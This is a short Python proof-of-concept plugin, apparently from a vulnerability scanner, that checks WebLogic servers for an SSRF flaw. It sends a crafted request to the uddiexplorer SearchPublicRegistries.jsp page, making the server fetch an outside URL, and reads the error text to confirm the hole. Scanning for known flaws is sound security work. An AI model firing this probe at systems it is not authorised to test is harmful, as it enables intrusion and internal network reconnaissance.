#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'weblogic ssrf'
        self.keyword = ['weblogic']
        self.info = 'weblogic ssrf'
        self.type = 'ssrf'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        self.get_url()
        if self.base_url:
            url = self.base_url+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
            try:
                res = self.curl('get',url)
                if res and "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
                    self.flag = 1
                    self.req.append({"page": '/uddiexplorer/SearchPublicRegistries.jsp'})
                    self.res.append({"info": url, "key": "/uddiexplorer/SearchPublicRegistries.jsp"})
            except:
                pass
